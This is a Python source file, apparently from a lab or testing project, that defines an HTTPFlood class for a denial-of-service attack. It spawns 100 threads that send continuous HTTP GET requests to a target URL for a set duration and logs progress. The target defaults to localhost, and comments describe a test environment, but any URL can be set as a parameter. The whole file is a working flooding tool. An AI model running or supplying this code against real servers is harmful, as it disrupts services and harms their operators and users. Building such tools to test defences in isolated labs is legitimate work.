import requests
import threading
import time
from logs.logger import setupLogger

# Initialize logger for this module
logger = setupLogger(__name__)

class HTTPFlood:
     
    def __init__(self, target_url="http://localhost:5000", num_threads=100, duration=60):
       
        self.target_url = target_url
        self.num_threads = num_threads
        self.duration = duration
        self.active = False  # Flag to control the attack state
        self.requests_sent = 0  # Counter for total requests sent
        self.lock = threading.Lock()  # Thread lock for safe counter increments

    def httpFlood(self):
        # Sends continuous HTTP GET requests to the target URL

        start_time = time.time()
        while self.active and (time.time() - start_time) < self.duration:
            try:
                # Send GET request to target URL
                response = requests.get(self.target_url)
                
                # Safely increment counter using thread lock

                """
                A thread lock is a mechaism that orevents multiple threads from accessing a shared resource at the same time.
                Basically, it prevents multiple threads from incrementing the counter at the same time
                
                It ensures that the request counter is incremented accurately AND prevents innacurate
                data being logged in the logger.
                """
                with self.lock:
                    self.requests_sent += 1
                    # Log progress every 100 requests
                    # Might need to increase this number to avoid flooding the logs
                    if self.requests_sent % 100 == 0:
                        logger.info(f"Sent {self.requests_sent} requests to {self.target_url}")
                        
            except requests.exceptions.RequestException as e:
                logger.error(f"Request failed: {str(e)}")
                
            # Since its a testinmg enviroment we dont want to crash the entire system 
            # possible change to a parameter in the object
            time.sleep(0.1)

    def startAttack(self):
        """
        Starts the HTTP flood attack.
        Spawns multiple threads and coordinates the attack duration.
        """
        logger.info(f"Starting HTTP flood attack on {self.target_url}")
        self.active = True
        self.requests_sent = 0
        
        # Create and start all threads
        threads = []
        for _ in range(self.num_threads):
            thread = threading.Thread(target=self.httpFlood)
            thread.start()
            threads.append(thread)

        # Wait for specified duration
        time.sleep(self.duration)
        
        # Stop attack and wait for all threads to complete
        self.active = False
        for thread in threads:
            thread.join()

        logger.info(f"Attack completed. Sent {self.requests_sent} requests")

if __name__ == "__main__":
    # Example usage when script is run directly
    flood = HTTPFlood(
        # Target 
        target_url="http://localhost:5000",  
        # Number of  threads
        num_threads=100,                     
        # Attack duration in secs
        duration=60                          
    )
    flood.startAttack()